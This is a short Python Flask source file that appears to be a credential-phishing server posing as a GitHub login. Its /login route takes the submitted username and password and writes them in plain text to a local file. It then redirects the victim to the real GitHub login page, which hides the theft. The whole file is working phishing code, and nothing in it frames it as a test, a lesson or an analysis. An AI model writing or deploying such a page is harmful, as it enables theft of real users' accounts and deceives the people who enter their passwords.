from flask import Flask, request, render_template, redirect

app = Flask(__name__)

# Save credentials in a file
def save_credentials(username, password):
    with open("logins.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    
    # Save login info
    save_credentials(username, password)

    # Redirect to real GitHub login page
    return redirect("https://github.com/login")

if __name__ == "__main__":
    app.run(debug=True)

